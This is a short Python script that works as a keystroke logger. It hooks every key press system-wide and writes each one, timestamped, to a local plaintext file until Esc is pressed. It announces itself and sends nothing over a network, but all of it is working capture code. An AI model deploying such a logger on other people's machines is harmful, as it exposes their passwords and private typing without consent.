import keyboard
import logging

# Set up logging to file
logging.basicConfig(filename="keystrokes.txt", level=logging.INFO, format='%(asctime)s - %(message)s')

def on_key_event(event):
    # Log each keystroke
    logging.info('Key {} pressed'.format(event.name))

# Set up a listener for all keyboard events
keyboard.on_press(on_key_event)

print("Keystroke logger is running. Press 'Esc' to stop.")

# Block the script and keep it running
keyboard.wait('esc')
